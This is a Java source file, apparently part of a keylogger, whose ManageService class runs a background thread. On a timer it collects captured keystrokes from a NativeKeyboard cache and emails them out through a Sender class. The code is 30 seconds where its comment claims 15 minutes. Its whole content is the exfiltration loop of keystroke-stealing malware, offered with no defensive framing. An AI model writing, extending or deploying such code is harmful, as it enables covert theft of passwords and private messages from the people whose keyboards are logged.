package handlers;

import keys.NativeKeyboard;

public class ManageService implements Runnable {
    private NativeKeyboard keyboard;
    private Thread service;

    public ManageService() {
        keyboard = new NativeKeyboard();

        service = new Thread(this, "Manage Service");
        service.start();
    }

    public NativeKeyboard getKeyboard() {
        return keyboard;
    }

    @Override
    public void run() {
        long start = System.nanoTime();
        while (true) {
            //conver nano seconds in milli
            long elapsed = (System.nanoTime() - start) / 1_000_000;
            //send mail every 15 minuted (google limits 150!);
            if(elapsed > 30_000) {
                try {
                    Sender.sendMail(Utils.prettyPrint(keyboard.getKeyCache()));
                    keyboard.onSend();
                } catch (Throwable e) {
                    e.printStackTrace();
                    keyboard.onFail();
                }

                start = System.nanoTime();
            }
        }
    }
}
